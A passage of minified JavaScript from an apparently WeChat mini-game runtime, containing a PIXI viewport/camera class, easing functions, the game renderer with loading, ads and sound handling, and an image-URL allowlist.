            this.vertical && t && !this.options.noDecelerate && t.activate({
                y: this.vertical * this.options.speed * this.reverse / (1e3 / 60)
            });
        }
    }, {
        key: "up",
        value: function () {
            this.horizontal && this.decelerateHorizontal(), this.vertical && this.decelerateVertical(),
                this.horizontal = this.vertical = null;
        }
    }, {
        key: "update",
        value: function () {
            var t;
            this.paused || (this.horizontal || this.vertical) && (t = this.parent.center, this.horizontal && (t.x += this.horizontal * this.options.speed),
                this.vertical && (t.y += this.vertical * this.options.speed), this.parent.moveCenter(t),
                this.parent.emit("moved", {
                    viewport: this.parent,
                    type: "mouse-edges"
                }));
        }
    }]), i;
}(), viewportOptions = {
    screenWidth: window.innerWidth,
    screenHeight: window.innerHeight,
    worldWidth: null,
    worldHeight: null,
    threshold: 5,
    passiveWheel: !0,
    stopPropagation: !1,
    forceHitArea: null,
    noTicker: !1,
    interaction: null,
    disableOnContextMenu: !1
}, Viewport = function (t) {
    function n() {
        var t, e = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : {}, i = (classCallCheck(this, n),
            possibleConstructorReturn(this, (n.__proto__ || Object.getPrototypeOf(n)).call(this)));
        return i.options = Object.assign({}, viewportOptions, e), e.ticker ? i.options.ticker = e.ticker : (t = PIXI__namespace,
            t = (parseInt(/^(\d+)\./.exec(PIXI$1.VERSION)[1]) < 5 ? t.ticker : t.Ticker).shared,
            i.options.ticker = e.ticker || t), i.screenWidth = i.options.screenWidth, i.screenHeight = i.options.screenHeight,
            i._worldWidth = i.options.worldWidth, i._worldHeight = i.options.worldHeight, i.forceHitArea = i.options.forceHitArea,
            i._x = 0, i._y = 0, i.threshold = i.options.threshold, i.options.divWheel = i.options.divWheel || document.body,
            i.options.disableOnContextMenu && (i.options.divWheel.oncontextmenu = function (t) {
                return t.preventDefault();
            }), i.options.noTicker || (i.tickerFunction = function () {
                return i.update(i.options.ticker.elapsedMS);
            }, i.options.ticker.add(i.tickerFunction)), i.plugins = new PluginManager$1(i),
            i;
    }
    return inherits(n, t), createClass(n, [{
        key: "destroy",
        value: function (t) {
            this.options.noTicker || this.options.ticker.remove(this.tickerFunction), get(n.prototype.__proto__ || Object.getPrototypeOf(n.prototype), "destroy", this).call(this, t);
        }
    }, {
        key: "update",
        value: function (t) {
            this.pause || (this.plugins.update(t), this.lastViewport && (this.lastViewport.x !== this.x || this.lastViewport.y !== this.y ? this.moving = !0 : this.moving && (this.emit("moved-end", this),
                this.moving = !1), this.lastViewport.scaleX !== this.scale.x || this.lastViewport.scaleY !== this.scale.y ? this.zooming = !0 : this.zooming && (this.emit("zoomed-end", this),
                    this.zooming = !1)), this.forceHitArea || (this._hitAreaDefault = new PIXI$1.Rectangle(this.left, this.top, this.worldScreenWidth, this.worldScreenHeight),
                        this.hitArea = this._hitAreaDefault), this._dirty = this._dirty || !this.lastViewport || this.lastViewport.x !== this.x || this.lastViewport.y !== this.y || this.lastViewport.scaleX !== this.scale.x || this.lastViewport.scaleY !== this.scale.y,
                this.lastViewport = {
                    x: this.x,
                    y: this.y,
                    scaleX: this.scale.x,
                    scaleY: this.scale.y
                }, this.emit("frame-end", this));
        }
    }, {
        key: "resize",
        value: function () {
            var t = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : window.innerWidth, e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : window.innerHeight, i = arguments[2], n = arguments[3];
            this.screenWidth = t, this.screenHeight = e, void 0 !== i && (this._worldWidth = i),
                void 0 !== n && (this._worldHeight = n), this.plugins.resize(), this.dirty = !0;
        }
    }, {
        key: "getVisibleBounds",
        value: function () {
            return new PIXI$1.Rectangle(this.left, this.top, this.worldScreenWidth, this.worldScreenHeight);
        }
    }, {
        key: "toWorld",
        value: function (t, e) {
            return 2 === arguments.length ? this.toLocal(new PIXI$1.Point(t, e)) : this.toLocal(t);
        }
    }, {
        key: "toScreen",
        value: function (t, e) {
            return 2 === arguments.length ? this.toGlobal(new PIXI$1.Point(t, e)) : this.toGlobal(t);
        }
    }, {
        key: "moveCenter",
        value: function () {
            var t = void 0, e = isNaN(arguments[0]) ? (t = arguments[0].x, arguments[0].y) : (t = arguments[0],
                arguments[1]);
            return this.position.set((this.worldScreenWidth / 2 - t + this._x) * this.scale.x, (this.worldScreenHeight / 2 - e + this._y) * this.scale.y),
                this.plugins.reset(), this.dirty = !0, this;
        }
    }, {
        key: "moveCorner",
        value: function (t, e) {
            return 1 === arguments.length ? this.position.set(-t.x * this.scale.x, -t.y * this.scale.y) : this.position.set(-t * this.scale.x, -e * this.scale.y),
                this.plugins.reset(), this;
        }
    }, {
        key: "fitWidth",
        value: function (t, e) {
            var i = !(2 < arguments.length && void 0 !== arguments[2]) || arguments[2], n = arguments[3], s = void 0, t = (e && (s = this.center),
                this.scale.x = this.screenWidth / t, i && (this.scale.y = this.scale.x), this.plugins.get("clamp-zoom"));
            return !n && t && t.clamp(), e && this.moveCenter(s), this;
        }
    }, {
        key: "fitHeight",
        value: function (t, e) {
            var i = !(2 < arguments.length && void 0 !== arguments[2]) || arguments[2], n = arguments[3], s = void 0, t = (e && (s = this.center),
                this.scale.y = this.screenHeight / t, i && (this.scale.x = this.scale.y), this.plugins.get("clamp-zoom"));
            return !n && t && t.clamp(), e && this.moveCenter(s), this;
        }
    }, {
        key: "fitWorld",
        value: function (t) {
            var e = void 0, i = (t && (e = this.center), this.scale.x = this.screenWidth / this.worldWidth,
                this.scale.y = this.screenHeight / this.worldHeight, this.scale.x < this.scale.y ? this.scale.y = this.scale.x : this.scale.x = this.scale.y,
                this.plugins.get("clamp-zoom"));
            return i && i.clamp(), t && this.moveCenter(e), this;
        }
    }, {
        key: "fit",
        value: function (t) {
            var e = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : this.worldWidth, i = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : this.worldHeight, n = void 0;
            return t && (n = this.center), this.scale.x = this.screenWidth / e, this.scale.y = this.screenHeight / i,
                this.scale.x < this.scale.y ? this.scale.y = this.scale.x : this.scale.x = this.scale.y,
                (e = this.plugins.get("clamp-zoom")) && e.clamp(), t && this.moveCenter(n), this;
        }
    }, {
        key: "setZoom",
        value: function (t, e) {
            var i = void 0;
            return e && (i = this.center), this.scale.set(t), (t = this.plugins.get("clamp-zoom")) && t.clamp(),
                e && this.moveCenter(i), this;
        }
    }, {
        key: "zoomPercent",
        value: function (t, e) {
            return this.setZoom(this.scale.x + this.scale.x * t, e);
        }
    }, {
        key: "zoom",
        value: function (t, e) {
            return this.fitWidth(t + this.worldScreenWidth, e), this;
        }
    }, {
        key: "snapZoom",
        value: function (t) {
            return this.plugins.add("snap-zoom", new SnapZoom(this, t)), this;
        }
    }, {
        key: "OOB",
        value: function () {
            return {
                left: this.left < 0,
                right: this.right > this.worldWidth,
                top: this.top < 0,
                bottom: this.bottom > this._worldHeight,
                cornerPoint: new PIXI$1.Point(this.worldWidth * this.scale.x - this.screenWidth, this.worldHeight * this.scale.y - this.screenHeight)
            };
        }
    }, {
        key: "drag",
        value: function (t) {
            return this.plugins.add("drag", new Drag(this, t)), this;
        }
    }, {
        key: "clamp",
        value: function (t) {
            return this.plugins.add("clamp", new Clamp(this, t)), this;
        }
    }, {
        key: "decelerate",
        value: function (t) {
            return this.plugins.add("decelerate", new Decelerate(this, t)), this;
        }
    }, {
        key: "bounce",
        value: function (t) {
            return this.plugins.add("bounce", new Bounce(this, t)), this;
        }
    }, {
        key: "pinch",
        value: function (t) {
            return this.plugins.add("pinch", new Pinch(this, t)), this;
        }
    }, {
        key: "snap",
        value: function (t, e, i) {
            return this.plugins.add("snap", new Snap(this, t, e, i)), this;
        }
    }, {
        key: "follow",
        value: function (t, e) {
            return this.plugins.add("follow", new Follow(this, t, e)), this;
        }
    }, {
        key: "wheel",
        value: function (t) {
            return this.plugins.add("wheel", new Wheel(this, t)), this;
        }
    }, {
        key: "clampZoom",
        value: function (t) {
            return this.plugins.add("clamp-zoom", new ClampZoom(this, t)), this;
        }
    }, {
        key: "mouseEdges",
        value: function (t) {
            return this.plugins.add("mouse-edges", new MouseEdges(this, t)), this;
        }
    }, {
        key: "ensureVisible",
        value: function (t, e, i, n, s) {
            s && (i > this.worldScreenWidth || n > this.worldScreenHeight) && (this.fit(!0, i, n),
                this.emit("zoomed", {
                    viewport: this,
                    type: "ensureVisible"
                })), s = !1, t < this.left ? (this.left = t, s = !0) : t + i > this.right && (this.right = t + i,
                    s = !0), e < this.top ? (this.top = e, s = !0) : e + n > this.bottom && (this.bottom = e + n,
                        s = !0), s && this.emit("moved", {
                            viewport: this,
                            type: "ensureVisible"
                        });
        }
    }, {
        key: "worldWidth",
        get: function () {
            return this._worldWidth || this.width / this.scale.x;
        },
        set: function (t) {
            this._worldWidth = t, this.plugins.resize();
        }
    }, {
        key: "worldHeight",
        get: function () {
            return this._worldHeight || this.height / this.scale.y;
        },
        set: function (t) {
            this._worldHeight = t, this.plugins.resize();
        }
    }, {
        key: "worldScreenWidth",
        get: function () {
            return this.screenWidth / this.scale.x;
        }
    }, {
        key: "worldScreenHeight",
        get: function () {
            return this.screenHeight / this.scale.y;
        }
    }, {
        key: "screenWorldWidth",
        get: function () {
            return this.worldWidth * this.scale.x;
        }
    }, {
        key: "screenWorldHeight",
        get: function () {
            return this.worldHeight * this.scale.y;
        }
    }, {
        key: "center",
        get: function () {
            return new PIXI$1.Point(this.worldScreenWidth / 2 - this.x / this.scale.x + this._x, this.worldScreenHeight / 2 - this.y / this.scale.y + this._y);
        },
        set: function (t) {
            this.moveCenter(t);
        }
    }, {
        key: "corner",
        get: function () {
            return new PIXI$1.Point(-this.x / this.scale.x, -this.y / this.scale.y);
        },
        set: function (t) {
            this.moveCorner(t);
        }
    }, {
        key: "scaled",
        set: function (t) {
            this.setZoom(t, !0);
        },
        get: function () {
            return this.scale.x;
        }
    }, {
        key: "right",
        get: function () {
            return -this.x / this.scale.x + this.worldScreenWidth;
        },
        set: function (t) {
            this.x = -t * this.scale.x + this.screenWidth, this.plugins.reset();
        }
    }, {
        key: "left",
        get: function () {
            return -this.x / this.scale.x;
        },
        set: function (t) {
            this.x = -t * this.scale.x, this.plugins.reset();
        }
    }, {
        key: "top",
        get: function () {
            return -this.y / this.scale.y;
        },
        set: function (t) {
            this.y = -t * this.scale.y, this.plugins.reset();
        }
    }, {
        key: "bottom",
        get: function () {
            return -this.y / this.scale.y + this.worldScreenHeight;
        },
        set: function (t) {
            this.y = -t * this.scale.y + this.screenHeight, this.plugins.reset();
        }
    }, {
        key: "dirty",
        get: function () {
            return this._dirty;
        },
        set: function (t) {
            this._dirty = t;
        }
    }, {
        key: "forceHitArea",
        get: function () {
            return this._forceHitArea;
        },
        set: function (t) {
            t ? (this._forceHitArea = t, this.hitArea = t) : (this._forceHitArea = null, this.hitArea = new PIXI$1.Rectangle(0, 0, this.worldWidth, this.worldHeight));
        }
    }, {
        key: "pause",
        get: function () {
            return this._pause;
        },
        set: function (t) {
            this._pause = t, this.lastViewport = null, this.moving = !1, this.zooming = !1;
        }
    }]), n;
}(PIXI$1.Container), commonjsGlobal = "undefined" != typeof globalThis ? globalThis : "undefined" != typeof window ? window : "undefined" != typeof global ? global : "undefined" != typeof self ? self : {};

function createCommonjsModule(t, e) {
    return t(e = {
        exports: {}
    }, e.exports), e.exports;
}

createCommonjsModule(function (t, e) {
    !function () {
        var s = {
            linear: function (t, e, i, n) {
                return i * t / n + e;
            },
            easeInQuad: function (t, e, i, n) {
                return i * (t /= n) * t + e;
            },
            easeOutQuad: function (t, e, i, n) {
                return -i * (t /= n) * (t - 2) + e;
            },
            easeInOutQuad: function (t, e, i, n) {
                return (t /= n / 2) < 1 ? i / 2 * t * t + e : -i / 2 * (--t * (t - 2) - 1) + e;
            },
            easeInCubic: function (t, e, i, n) {
                return i * (t /= n) * t * t + e;
            },
            easeOutCubic: function (t, e, i, n) {
                return i * ((t = t / n - 1) * t * t + 1) + e;
            },
            easeInOutCubic: function (t, e, i, n) {
                return (t /= n / 2) < 1 ? i / 2 * t * t * t + e : i / 2 * ((t -= 2) * t * t + 2) + e;
            },
            easeInQuart: function (t, e, i, n) {
                return i * (t /= n) * t * t * t + e;
            },
            easeOutQuart: function (t, e, i, n) {
                return -i * ((t = t / n - 1) * t * t * t - 1) + e;
            },
            easeInOutQuart: function (t, e, i, n) {
                return (t /= n / 2) < 1 ? i / 2 * t * t * t * t + e : -i / 2 * ((t -= 2) * t * t * t - 2) + e;
            },
            easeInQuint: function (t, e, i, n) {
                return i * (t /= n) * t * t * t * t + e;
            },
            easeOutQuint: function (t, e, i, n) {
                return i * ((t = t / n - 1) * t * t * t * t + 1) + e;
            },
            easeInOutQuint: function (t, e, i, n) {
                return (t /= n / 2) < 1 ? i / 2 * t * t * t * t * t + e : i / 2 * ((t -= 2) * t * t * t * t + 2) + e;
            },
            easeInSine: function (t, e, i, n) {
                return -i * Math.cos(t / n * (Math.PI / 2)) + i + e;
            },
            easeOutSine: function (t, e, i, n) {
                return i * Math.sin(t / n * (Math.PI / 2)) + e;
            },
            easeInOutSine: function (t, e, i, n) {
                return -i / 2 * (Math.cos(Math.PI * t / n) - 1) + e;
            },
            easeInExpo: function (t, e, i, n) {
                return 0 === t ? e : i * Math.pow(2, 10 * (t / n - 1)) + e;
            },
            easeOutExpo: function (t, e, i, n) {
                return t === n ? e + i : i * (1 - Math.pow(2, -10 * t / n)) + e;
            },
            easeInOutExpo: function (t, e, i, n) {
                return (t /= n / 2) < 1 ? i / 2 * Math.pow(2, 10 * (t - 1)) + e : i / 2 * (2 - Math.pow(2, -10 * --t)) + e;
            },
            easeInCirc: function (t, e, i, n) {
                return -i * (Math.sqrt(1 - (t /= n) * t) - 1) + e;
            },
            easeOutCirc: function (t, e, i, n) {
                return i * Math.sqrt(1 - (t = t / n - 1) * t) + e;
            },
            easeInOutCirc: function (t, e, i, n) {
                return (t /= n / 2) < 1 ? -i / 2 * (Math.sqrt(1 - t * t) - 1) + e : i / 2 * (Math.sqrt(1 - (t -= 2) * t) + 1) + e;
            },
            easeInElastic: function (t, e, i, n) {
                var s, r = i;
                return 0 !== t && (t /= n), s = .3 * n, i = r < Math.abs(i) ? (r = i, s / 4) : s / (2 * Math.PI) * Math.asin(i / r),
                    -(r * Math.pow(2, 10 * --t) * Math.sin((t * n - i) * (2 * Math.PI) / s)) + e;
            },
            easeOutElastic: function (t, e, i, n) {
                var s, r, a = i;
                return 0 !== t && (t /= n), r = .3 * n, s = a < Math.abs(i) ? (a = i, r / 4) : r / (2 * Math.PI) * Math.asin(i / a),
                    a * Math.pow(2, -10 * t) * Math.sin((t * n - s) * (2 * Math.PI) / r) + i + e;
            },
            easeInOutElastic: function (t, e, i, n) {
                var s, r, a = i;
                return 0 !== t && (t /= n / 2), r = n * (.3 * 1.5), s = a < Math.abs(i) ? (a = i,
                    r / 4) : r / (2 * Math.PI) * Math.asin(i / a), t < 1 ? a * Math.pow(2, 10 * --t) * Math.sin((t * n - s) * (2 * Math.PI) / r) * -.5 + e : a * Math.pow(2, -10 * --t) * Math.sin((t * n - s) * (2 * Math.PI) / r) * .5 + i + e;
            },
            easeInBack: function (t, e, i, n, s) {
                return i * (t /= n) * t * (((s = void 0 === s ? 1.70158 : s) + 1) * t - s) + e;
            },
            easeOutBack: function (t, e, i, n, s) {
                return i * ((t = t / n - 1) * t * (((s = void 0 === s ? 1.70158 : s) + 1) * t + s) + 1) + e;
            },
            easeInOutBack: function (t, e, i, n, s) {
                return void 0 === s && (s = 1.70158), (t /= n / 2) < 1 ? i / 2 * (t * t * ((1 + (s *= 1.525)) * t - s)) + e : i / 2 * ((t -= 2) * t * ((1 + (s *= 1.525)) * t + s) + 2) + e;
            },
            easeInBounce: function (t, e, i, n) {
                return i - s.easeOutBounce(n - t, 0, i, n) + e;
            },
            easeOutBounce: function (t, e, i, n) {
                return (t /= n) < 1 / 2.75 ? i * (7.5625 * t * t) + e : t < 2 / 2.75 ? i * (7.5625 * (t -= 1.5 / 2.75) * t + .75) + e : t < 2.5 / 2.75 ? i * (7.5625 * (t -= 2.25 / 2.75) * t + .9375) + e : i * (7.5625 * (t -= 2.625 / 2.75) * t + .984375) + e;
            },
            easeInOutBounce: function (t, e, i, n) {
                return t < n / 2 ? .5 * s.easeInBounce(2 * t, 0, i, n) + e : .5 * s.easeOutBounce(2 * t - n, 0, i, n) + .5 * i + e;
            }
        };
        t.exports = s;
    }.call(commonjsGlobal);
});

var Camera = Viewport, cdn_url = Config.cdn_url, RenderConfig = {
    deps: {},
    language: "",
    options: {
        backgroundColor: 0,
        antialias: !0
    }
}, App = (isMiniGame && (RenderConfig.options.view = canvas), PIXI__namespace.settings.SCALE_MODE = PIXI__namespace.SCALE_MODES.NEAREST,
    function (t) {
        function s(t, e) {
            classCallCheck(this, s);
            var i = possibleConstructorReturn(this, (s.__proto__ || Object.getPrototypeOf(s)).call(this, e.options)), t = (i.vm = t,
                getDeviceInfo().devicePixelRatio);
            return i.DEVICEPIXEL = t / 2, isMiniGame || e.options.view || (i.view.height = e.options.height,
                i.view.width = e.options.width, document.getElementById("preview").appendChild(i.view)),
                (i.renderer = i).initStage(e.options.width, e.options.height), i.subContext = subContext,
                i;
        }
        return inherits(s, t), createClass(s, null, [{
            key: "getInstance",
            value: function (t) {
                var n = getDeviceInfo().devicePixelRatio, e = Config.RealWidth * n, i = Config.RealHeight * n;
                if (RenderConfig.options.width = e, RenderConfig.options.height = i, s.instance) return s.instance.renderer.resize(e, i),
                    s.instance.initStage(e, i), !isMiniGame && document.getElementById("preview").childNodes.length < 1 && document.getElementById("preview").appendChild(s.instance.view),
                    isMiniGame || (s.instance.view.style.display = "", s.instance.view.style.width = Config.RealWidth * Config._zoom + "px",
                        s.instance.view.style.height = Config.RealHeight * Config._zoom + "px"), s.instance;
                if (null != RenderConfig) return isMiniGame && (RenderConfig.view = canvas), s.instance = new s(t, RenderConfig),
                    isMiniGame ? s.instance.plugins.interaction.mapPositionToPoint = function (t, e, i) {
                        t.set(e * n, i * n);
                    } : (s.instance.view.style.width = Config.RealWidth * Config._zoom + "px", s.instance.view.style.height = Config.RealHeight * Config._zoom + "px"),
                    s.instance;
                throw new ReferenceError("Please provide config for theatre before using it.");
            }
        }]), createClass(s, [{
            key: "initStage",
            value: function (t, e) {
                this._Container = new PIXI__namespace.Container(), this.stage = new PIXI__namespace.Container(),
                    this.stage.name = "stage", this.gameWidth = t, this.gameHeight = e, this.stage.interactive = !0,
                    this._Container.addChild(this.stage), this.scaleToScreen(), this.stage.pivot.set(-t / 2 / this.stage.scale.x, -e / 2 / this.stage.scale.y),
                    this.initData(), this.ui = {}, this.eventEmitter = getEventEmitter();
            }
        }, {
            key: "resizeView",
            value: function (t) {
                Config._zoom = t, s.instance.view.style.width = Config.RealWidth * Config._zoom + "px",
                    s.instance.view.style.height = Config.RealHeight * Config._zoom + "px";
            }
        }, {
            key: "connect",
            value: function (t) {
                this.readyForLoadGame(), isMiniGame || this.eventEmitter.emit("startLoad"), this.runtimeData = t;
            }
        }, {
            key: "readyForLoadGame",
            value: function () {
                this.ui.loadingUI = new Loading(this), !isMiniGame || window.GameGlobal && GameGlobal.isPublish || (this.menuBtn = new MenuBtn(this)),
                    this.renderStage(), this.ui.gameInfo = new (window.isPublic || window.isPublish ? GameInfo : Config.horizontal ? LandscapeGameInfo : GameInfo$1)(this);
                var e = this;
                this.loaderManager = Loader.getInstance({
                    onProgress: function (t) {
                        100 < (t = Math.ceil(t || 0)) && (t = 100), isMiniGame ? (e.ui.gameInfo.setProgress(t),
                            e.ui.loadingUI && e.ui.loadingUI.setText("资源加载中 " + t + "%")) : e.runtimeData && e.runtimeData.currentScene && (!e.runtimeData.currentScene || e.runtimeData.isResourceReady) || (e.ui.loadingUI.setText("资源加载中 " + t + "%"),
                                e.renderStage());
                    },
                    onComplete: function () {
                        e.soundManager || (e.soundManager = new SoundManager({
                            cdn: cdn_url
                        })), isMiniGame && (e.ui.gameInfo.setProgress(100), window.isPublish || window.isPublic) && (e.ui.gameInfo.infoHide(),
                            e.runtimeData.playing || (console.log("进度加载完毕，触发startCbk"), e.ui.gameInfo.startCbk && e.ui.gameInfo.startCbk()));
                    },
                    onError: function (t) {
                        isMiniGame && mta && mta.Event.stat("info_load_resource_error", {}), console.error(t);
                    }
                }), this.initMiniGameEvent(), this.ui.dialog = new Dialog(this);
            }
        }, {
            key: "initGame",
            value: function () {
                this.collisionManager = new CollisionManager(this), this.ui.RewardedVideoAd = new IDERewardAd(this),
                    this.ui.BannerAd = new BannerAd(this), this.ui.NativeAd = new NativeAd(this);
            }
        }, {
            key: "resetStage",
            value: function () {
                this.camera.plugins.plugins.follow && (this.camera.plugins.plugins.follow.paused = !0),
                    this.camera.moveCenter(0, 0), this.collisionManager && this.collisionManager.clear();
            }
        }, {
            key: "initCamera",
            value: function () {
                var t = getDeviceInfo().devicePixelRatio, e = Config.RealWidth / this.stage.scale.x, i = Config.RealHeight / this.stage.scale.y;
                this.cameraBox = new PIXI__namespace.Container(), this.camera = new Camera({
                    screenWidth: e * t,
                    screenHeight: i * t,
                    passiveWheel: !0,
                    stopPropagation: !1,
                    noTicker: !0,
                    interaction: this.renderer.plugins.interaction
                }), this.camera.position.set(e * this.DEVICEPIXEL, i * this.DEVICEPIXEL), this.cameraBox.addChild(this.camera),
                    this.cameraBox.position.set(-e * this.DEVICEPIXEL, -i * this.DEVICEPIXEL), this.stage.addChild(this.cameraBox),
                    LB.isDebug && (this._outlineCollider = new PIXI__namespace.Graphics(), this.stage.addChild(this._outlineCollider));
            }
        }, {
            key: "destroyOutlineCollider",
            value: function () {
                this._outlineCollider && (this._outlineCollider.parent.removeChild(this._outlineCollider),
                    this._outlineCollider.destroy(), this._outlineCollider = null);
            }
        }, {
            key: "scaleToScreen",
            value: function () {
                var t, e;
                this.realWidth = this.gameWidth, this.realHeight = this.gameHeight, 1 === Config.adaptationMode ? e = t = Config.RealWidth / Config.GAME_WIDTH : 2 === Config.adaptationMode ? t = e = Config.RealHeight / Config.GAME_HEIGHT : e = t = 1,
                    this.stage.scale.set(t, e);
            }
        }, {
            key: "localToScreen",
            value: function (t) {
                var e, i = getDeviceInfo(), n = this.stage.scale, s = i.devicePixelRatio, r = i.windowWidth / Config.GAME_WIDTH;
                return (i = i.windowHeight / Config.GAME_HEIGHT) < r ? (e = (1 - n.x) / 2 * this.gameWidth,
                    t.x = t.x * n.x + e) : (e = (1 - n.y) / 2 * this.gameHeight, t.y = t.y * n.y + e),
                {
                    x: t.x / s * r,
                    y: t.y / s * i
                };
            }
        }, {
            key: "localSizeToScreen",
            value: function (t) {
                var e = getDeviceInfo(), i = this.stage.scale, n = e.devicePixelRatio, s = e.windowWidth / Config.GAME_WIDTH, e = e.windowHeight / Config.GAME_HEIGHT, t = {
                    width: t.width / n * s,
                    height: t.height / n * e
                };
                return e < s ? t.width *= i.x : t.height *= i.y, t;
            }
        }, {
            key: "rankInit",
            value: function (t) {
                this.hasRank = !0, subContext.init(this, t.config), (t = this.runtimeData && this.runtimeData.getBlockFeildsValue("looks_rankperiod")) && subContext.setRankPeriod(t.OPTION_LIST.value);
            }
        }, {
            key: "pauseGame",
            value: function () {
                this.vm.status = !1, this.eventEmitter.emit("game_pause"), this.vm._blockEngine.pauseAllThread(!0),
                    this.renderStage();
            }
        }, {
            key: "restartGame",
            value: function () {
                this.vm._blockEngine.pauseAllThread(!1), this.vm.status = !0, this.eventEmitter.emit("game_start");
            }
        }, {
            key: "update",
            value: function (t) {
                LB.isDebug && !this._outlineCollider && (this._outlineCollider = new PIXI__namespace.Graphics(),
                    this.stage.addChild(this._outlineCollider)), this._outlineCollider && this._outlineCollider.clear(),
                    Performance.startPoint("update_scene"), Performance.startPoint("cameraUpdate"),
                    this.camera.update(t), Performance.endPoint("cameraUpdate"), Performance.startPoint("currentScene"),
                    this.runtimeData.currentScene.update(t), Performance.endPoint("currentScene"), Performance.endPoint("update_scene"),
                    this.runtimeData.currentScene.isSpriteReady && (Performance.startPoint("collisionEveryFrame"),
                        this.collisionManager.update(), Performance.endPoint("collisionEveryFrame")), Performance.startPoint("clearFriendRank"),
                    isMiniGame && this.hasRank && subContext.update(), Performance.endPoint("clearFriendRank"),
                    Performance.log("totalSprites", this.runtimeData.currentScene.sprites.length), this.vm._physicsSystem && Performance.log("totalSpritesPhysic", this.vm._physicsSystem.world.m_bodyCount),
                    Performance.startPoint("pixiRender"), this.renderStage(), Performance.endPoint("pixiRender");
            }
        }, {
            key: "renderStage",
            value: function () {
                this.renderer.render(this._Container);
            }
        }, {
            key: "removeAllScene",
            value: function () {
                this.stage.removeChildren().forEach(function (t) {
                    t.destroy({
                        children: !0,
                        texture: !0,
                        baseTexture: !0
                    });
                }), this.camera.destroy(!0);
            }
        }, {
            key: "initData",
            value: function (t) {
                this.initCamera();
            }
        }, {
            key: "initMiniGameEvent",
            value: function () {
                var t = this;
                isMiniGame && (wx.onHide(function () {
                    t._hide = 1;
                }), wx.onShow(function () {
                    t._hide && t.soundManager && (t.soundManager.resumeBgmByShow(), t._hide = 0);
                }), wx.onAudioInterruptionEnd) && wx.onAudioInterruptionEnd(function () {
                    t.soundManager && t.soundManager.resumeBgmByShow();
                });
            }
        }, {
            key: "resetData",
            value: function () {
                this.removeAllScene(), this.soundManager && this.soundManager.stopAll(), this.initData(!0);
            }
        }, {
            key: "dispose",
            value: function () {
                this.menuBtn && (this.menuBtn.destroy(), this.menuBtn = null), this.eventEmitter && (this.eventEmitter.removeAllListeners(),
                    this.eventEmitter = null), this.collisionManager && (this.collisionManager.clear(),
                        this.collisionManager = null), this.soundManager && (this.soundManager.destroyAll(),
                            this.soundManager = null), this.destroyOutlineCollider(), this.runtimeData = null,
                    this.dialog = null, this.loaderManager && (this.loaderManager.destroy(), this.loaderManager = null),
                    this.stage && (this.stage.destroy(!0), this.stage = null), this._Container && (this._Container.destroy(!0),
                        this._Container = null), isMiniGame || (s.instance.view.style.display = "none"),
                    s.instance = null, this.ui.gameInfo && this.ui.gameInfo.release(), isMiniGame ? (console.error("执行 render reset"),
                        this.reset()) : (this.renderer.gl.getExtension("WEBGL_lose_context").loseContext(),
                            this.destroy(!0, !0));
            }
        }, {
            key: "getSpriteById",
            value: function (t) {
                var e = this.runtimeData.getSpriteById(t);
                if (e) return e.renderer;
                throw new SpriteMissing(t);
            }
        }, {
            key: "stageInfo",
            get: function () {
                return {
                    pos: {
                        x: this.stage.x.toFixed(2),
                        y: this.stage.y.toFixed(2)
                    },
                    width: this.gameWidth,
                    height: this.gameHeight
                };
            }
        }, {
            key: "penetration",
            get: function () {
                return !!(this.ui.gameInfo && this.ui.gameInfo.isInfoShowing || this.subContext.friendRankShow || this.subContext.ideSubContex && this.subContext.ideSubContext.ideFriendRankShow);
            }
        }]), s;
    }(PIXI__namespace.Renderer));

function bindEvents(r) {
    var a = Object.create(null), o = getEventEmitter();
    r.hasBlockOfType(OPCODE.eventDeviceMotionChange) && (wx.startDeviceMotionListening({
        interval: "game",
        success: function () {
            console.log("DeviceMotionListening open success!");
        },
        fail: function () {
            console.log("DeviceMotionListening failed success!");
        },
        complete: function () {
            console.log("DeviceMotionListening!!!!");
        }
    }), wx.onDeviceMotionChange(function (t) {
        var e = t.alpha, i = t.beta, t = t.gamma;
        a.motion || (a.motion = {
            alpha: e,
            beta: i,
            gamma: t
        });
        (e = a.motion).alpha;
        var n = e.beta, e = e.gamma, s = r.config.meta.horizontal;
        !1 === (void 0 !== s && s) ? (t < e - 5 && o.emit(OPCODE.eventDeviceMotionChange, {
            OPTION_LIST: "_left_"
        }), e + 5 < t && o.emit(OPCODE.eventDeviceMotionChange, {
            OPTION_LIST: "_right_"
        })) : (i < n - 5 && o.emit(OPCODE.eventDeviceMotionChange, {
            OPTION_LIST: "_left_"
        }), n + 5 < i && o.emit(OPCODE.eventDeviceMotionChange, {
            OPTION_LIST: "_right_"
        }));
    }));
}

var a$1 = [], setBlendMode = function t(e, i) {
    var n = e.children.length;
    if (0 < n) for (var s = 0; s < n; s++) {
        var r = e.children[s];
        r.blendMode = i, t(r, i);
    }
}, defaultImg = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";

function isWhiteUrl(t) {
    if ("string" == typeof t) for (var e = ["https://mmgame.qpic.cn/", "https://res.wx.qq.com/", "https://gamemaker.qpic.cn/", "https://wximg.qq.com/", "data:image/"], i = 0; i < e.length; i++) if (0 === t.indexOf(e[i])) return t;
    return defaultImg;
}

var Instance = function () {
    function e(t) {
        classCallCheck(this, e), this._runtime = t.runtime, this._objectType = t.objectType,
            this._sdkInstance = null, this._uid = t.uid, this._flags = 0, this._instVarValues = a$1,
            this._renderTarget = t.sprite, this._behaviorInstances = [];
    }
    return createClass(e, [{
        key: "release",
        value: function () {
            this._renderTarget.removeChildren(), this._sdkInstance.release(), this._sdkInstance = null,
                this._renderTarget = null, this._objectType = null, this._runtime = null, this._behaviorInstances.length = 0,
                this._instVarValues.length = 0;
        }
    }, {
        key: "reset",
        value: function () {
            this._sdkInstance && this._sdkInstance.reset();
        }
    }, {
        key: "createSdkInstance",
        value: function (t, e) {
            var i = this;
            if (this._sdkInstance) throw new Error("already got sdk instance");
            var n, s = this._objectType.getInstanceSdkCtor();
            for (n in t) "string" == typeof t[n] && 0 === t[n].indexOf("http") && (t[n] = isWhiteUrl(t[n]));
            if (this._sdkInstance = new s(this, t), this._sdkInstance.renderTarget && e && setTimeout(function () {
                setBlendMode(i._sdkInstance.renderTarget, e.blendMode || 0);
            }, 0), !(this._sdkInstance instanceof LB.SDK.IPluginInstanceBase)) throw new Error("sdk type must derive from SDK.IPluginInstanceBase");
        }
    }, {
